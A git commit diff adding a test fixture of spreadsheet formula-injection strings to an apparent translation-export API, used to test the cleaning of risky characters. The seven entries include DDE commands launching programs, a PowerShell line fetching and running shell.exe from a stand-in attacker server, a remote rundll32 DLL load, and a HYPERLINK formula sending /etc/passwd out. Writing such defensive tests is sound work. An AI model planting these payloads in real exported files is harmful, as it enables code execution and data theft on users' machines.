587bd6a582ed9692702b7ff1e87bb554fb8a7abe
bvenceslas <bvenceslas@gmail.com>
2022-01-27 16:10:08 +0200

    added test for the cleaning risky characters

--- api/src/formatters/fixtures/index.ts
+++ api/src/formatters/fixtures/index.ts
@@ -25,3 +25,36 @@ export const simpleFormatFixture: IntermediateTranslationFormat = {
     },
   ],
 };
+
+export const riskyPayloads: IntermediateTranslationFormat = {
+  translations: [
+    {
+      term: 'DDE ("cmd";"/C calc";"!A0")A0',
+      translation: 'first',
+    },
+    {
+      term: `@SUM(1+9)*cmd|' /C calc'!A0`,
+      translation: `second`,
+    },
+    {
+      term: `=10+20+cmd|' /C calc'!A0`,
+      translation: `third`,
+    },
+    {
+      term: `=cmd|' /C notepad'!'A1'`,
+      translation: `fourth`,
+    },
+    {
+      term: `=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0`,
+      translation: `fifth`,
+    },
+    {
+      term: `=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1`,
+      translation: `sixth`,
+    },
+    {
+      term: `=HYPERLINK(CONCATENATE("http://0.0.0.0:80/123.txt?v="; ('file:///etc/passwd'#$passwd.A1));"test-poc")`,
+      translation: `seventh`,
+    },
+  ],
+};
